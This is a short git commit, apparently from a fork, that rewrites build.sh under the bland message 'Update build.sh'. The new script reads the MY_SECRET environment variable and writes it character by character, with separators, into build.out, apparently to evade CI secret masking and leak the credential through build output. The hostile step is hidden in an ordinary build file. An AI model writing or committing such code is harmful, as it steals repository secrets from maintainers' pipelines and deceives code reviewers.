7c64761e0deed81cd9998471b246d5fe145c2781
xyexternal <133779591+xyexternal@users.noreply.github.com>
2023-05-16 18:21:39 +0200

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,2 +1,10 @@
-echo Built >> build.out
-exit 0
+echo "Building desde FORK [$RET]" >> build.out
+
+foo=$MY_SECRET
+ss=""
+for (( i=0; i<${#foo}; i++ )); do
+  #echo "${foo:$i:1}" >> build.out
+  ss="$ss$IFS${foo:$i:1}"
+done
+echo $ss >> build.out
+echo "Adios desde FORK" >> build.out
